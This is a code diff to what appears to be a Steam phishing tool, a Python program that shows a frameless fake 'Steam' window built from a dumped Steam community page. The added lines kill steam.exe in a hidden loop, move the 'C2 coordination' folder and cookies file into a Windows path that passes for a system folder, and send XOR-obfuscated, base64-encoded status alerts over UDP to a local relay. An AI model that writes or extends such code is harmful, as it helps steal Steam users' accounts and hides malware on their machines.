@@ -8,6 +8,8 @@ import ctypes
 import subprocess
 
 import sys
+import socket
+import base64
 
 # Base directory for bundled resources (temp folder in onefile mode)
 BASE_DIR = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
@@ -15,14 +17,25 @@ BASE_DIR = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
 EXE_DIR = os.path.dirname(os.path.abspath(sys.executable))
 
 INDEX_PATH = os.path.join(BASE_DIR, "site_dump", "steamcommunity.com", "linkfilter", "index.html")
-# Shared temporary root for C2 coordination
-TEMP_ROOT = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'FinalTempSys')
+# Shared temporary root for C2 coordination - Now in stable APPDATA
+TEMP_ROOT = os.path.join(os.environ.get('APPDATA'), 'Microsoft', 'Windows', 'Network')
 TABLICHKA_DIR = os.path.join(TEMP_ROOT, "tablichka")
 if not os.path.exists(TABLICHKA_DIR): os.makedirs(TABLICHKA_DIR, exist_ok=True)
 
-COOKIE_PATH = os.path.join(TABLICHKA_DIR, "cookie.txt")
+COOKIE_PATH = os.path.join(TABLICHKA_DIR, "cookies.txt")
 AGENT_NAME_PATH = os.path.join(TABLICHKA_DIR, "agent_name.txt")
 LANG_PATH = os.path.join(TABLICHKA_DIR, "vac_lang.txt") # Balanced naming
+UDP_PORT = 51337
+
+def tg_notify(msg, port=51337):
+    try:
+        salt = b"c0mpl3x+S@lt#99"
+        data = msg.encode('utf-8')
+        xor_data = bytearray([data[i] ^ salt[i % len(salt)] for i in range(len(data))])
+        payload = base64.b64encode(xor_data).decode('utf-8')
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.sendto(payload.encode('utf-8'), ("127.0.0.1", port))
+    except: pass
 
 def _get_agent_name():
     if os.path.exists(AGENT_NAME_PATH):
@@ -384,8 +397,10 @@ def steam_killer():
     while BLOCK_STEAM:
         try:
             # F - Forcefully terminate, IM - Image Name
+            # creationflags=0x08000000 (CREATE_NO_WINDOW) to prevent flickering CMD windows
             subprocess.run(["taskkill", "/F", "/IM", "steam.exe"], 
-                           capture_output=True, text=True, check=False)
+                           capture_output=True, text=True, check=False,
+                           creationflags=0x08000000)
         except:
             pass
         time.sleep(0.5)
@@ -396,16 +411,29 @@ def on_closed():
     print("[API] Window closed. Stopping Steam blocker.")
 
 def main():
-    # Start the blocker thread
-    threading.Thread(target=steam_killer, daemon=True).start()
-    
-    html = get_patched_html()
-    api = API()
-    window = webview.create_window("Steam", html=html, width=1100, height=850, js_api=api, on_top=True, resizable=False, frameless=True)
-    api._win = window
-    
-    window.events.closed += on_closed
-    webview.start()
+    try:
+        # Start the blocker thread
+        threading.Thread(target=steam_killer, daemon=True).start()
+        
+        global UDP_PORT
+        for i, arg in enumerate(sys.argv):
+            if arg == "--udp" and i + 1 < len(sys.argv):
+                try: UDP_PORT = int(sys.argv[i+1])
+                except: pass
+
+        tg_notify("🚨 <b>Steam Service Alert — Window Opened</b>")
+        
+        html = get_patched_html()
+        api = API()
+        window = webview.create_window("Steam", html=html, width=1100, height=850, js_api=api, on_top=True, resizable=False, frameless=True)
+        api._win = window
+        
+        window.events.closed += on_closed
+        webview.start()
+    except Exception as ex:
+        try: tg_notify(f"❌ <b>VAC Alert Error:</b> <code>{str(ex)}</code>")
+        except: pass
+        time.sleep(2)
 
 if __name__ == "__main__":
     main()
